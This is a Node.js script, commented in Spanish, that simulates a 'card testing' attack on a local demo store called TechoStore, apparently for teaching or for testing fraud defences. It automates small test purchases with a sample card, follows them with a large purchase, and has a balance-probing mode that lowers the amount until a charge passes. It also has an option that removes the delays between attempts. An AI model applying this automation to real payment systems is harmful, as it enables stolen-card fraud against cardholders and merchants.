// ===== SIMULADOR DE ATAQUE "CARD TESTING" EN TECHOSTORE =====
// Caso: alguien ya tiene los datos completos de una tarjeta (número, vencimiento y CVV)
// y automatiza compras en TechoStore. Dos modos:
//   rafaga (default): compra artículos baratos varias veces seguidas para comprobar que
//                     la tarjeta funciona y, si pasan, intenta una compra cara.
//   saldo:            intenta compras grandes y va bajando el monto hasta que una pase
//                     (sondeo de saldo).
// Usa el mismo endpoint de compra que el botón "Pagar" de la tienda, en el servidor local.
//
// Uso:  npm run ataque
//       npm run ataque -- --modo saldo
//       npm run ataque -- --rapido
//       npm run ataque -- --tarjeta 4521991033451230 --exp 03/28 --cvv 952
import { parseArgs } from 'node:util';

const { values: opciones } = parseArgs({
  options: {
    tarjeta: { type: 'string', default: '4521883466729804' }, // tarjeta de Carlos
    exp:     { type: 'string', default: '08/29' },
    cvv:     { type: 'string', default: '417' },
    titular: { type: 'string', default: 'CARLOS MENDEZ' },
    modo:    { type: 'string', default: 'rafaga' },
    rapido:  { type: 'boolean', default: false },
  },
});

const PUERTO = Number(process.env.PORT) || 3000;
const TIENDA = `http://localhost:${PUERTO}/api/tienda`;
const PAUSA_MS = opciones.rapido ? 0 : 2500;

// Compras de prueba (baratas) y la compra final (cara)
const PRUEBAS = [{ sticker: 1 }, { llavero: 1 }, { sticker: 1 }, { llavero: 1 }];
const COMPRA_GRANDE = { teclado: 1, audifonos: 1 };

// Sondeo de saldo: carritos de mayor a menor
const DESCENDENTE = [{ laptop: 1 }, { teclado: 4 }, { teclado: 2 }, { teclado: 1 }, { audifonos: 1 }, { mouse: 1 }];

const tarjeta = { numero: opciones.tarjeta, exp: opciones.exp, cvv: opciones.cvv, titular: opciones.titular };

const color = (c, s) => `\x1b[${c}m${s}\x1b[0m`;
const dormir = (ms) => new Promise((r) => setTimeout(r, ms));
const mascara = (n) => `${n.slice(0, 4)} **** **** ${n.slice(-4)}`;

async function comprar(items, catalogo) {
  const descripcion = Object.entries(items).map(([id, c]) => `${c}x ${catalogo[id].nombre}`).join(' + ');
  const total = Object.entries(items).reduce((s, [id, c]) => s + catalogo[id].precio * c, 0);

  const res = await fetch(`${TIENDA}/compra`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ items, tarjeta }),
  });
  const r = await res.json();

  const etiqueta = r.aprobado ? color('32', 'APROBADO ') : color('31', 'RECHAZADO');
  console.log(`  $${String(total).padStart(6)}  ${descripcion.padEnd(46)} ${etiqueta} ${r.motivo ? color('2', r.motivo) : ''}`);
  return r;
}

async function rafaga(catalogo) {
  console.log(color('33', 'Fase 1 · Compras de prueba'));
  let aprobadas = 0;
  for (const items of PRUEBAS) {
    const r = await comprar(items, catalogo);
    await dormir(PAUSA_MS);
    if (r.aprobado) aprobadas++;
    else if (r.motivo === 'Tarjeta bloqueada') return console.log(color('2', '\nLa tarjeta está bloqueada. Fin.\n'));
  }

  if (!aprobadas) return console.log(color('2', '\nNinguna compra de prueba pasó. La tarjeta no sirve. Fin.\n'));

  console.log(color('33', `\nFase 2 · ${aprobadas} compra(s) de prueba pasaron. Compra grande`));
  await comprar(COMPRA_GRANDE, catalogo);
}

async function sondeoDeSaldo(catalogo) {
  console.log(color('33', 'Compras grandes, bajando el monto hasta que una pase'));
  for (const items of DESCENDENTE) {
    const r = await comprar(items, catalogo);
    if (r.aprobado) return console.log(color('2', '\nEncontró un monto que pasa. Fin.'));
    if (r.motivo !== 'Fondos insuficientes') return console.log(color('2', `\n${r.motivo}. Fin.`));
    await dormir(PAUSA_MS);
  }
}

async function main() {
  const productos = await (await fetch(`${TIENDA}/productos`)).json();
  const catalogo = Object.fromEntries(productos.map((p) => [p.id, p]));

  console.log(color('1', `\nTarjeta: ${mascara(tarjeta.numero)}  vence ${tarjeta.exp}  ·  comercio: TechoStore\n`));

  if (opciones.modo === 'saldo') await sondeoDeSaldo(catalogo);
  else await rafaga(catalogo);
  console.log();
}

main().catch((e) => {
  console.error(color('31', `\nNo se pudo contactar a la tienda en ${TIENDA}. ¿Está corriendo "npm start"?\n`), e.message);
  process.exit(1);
});
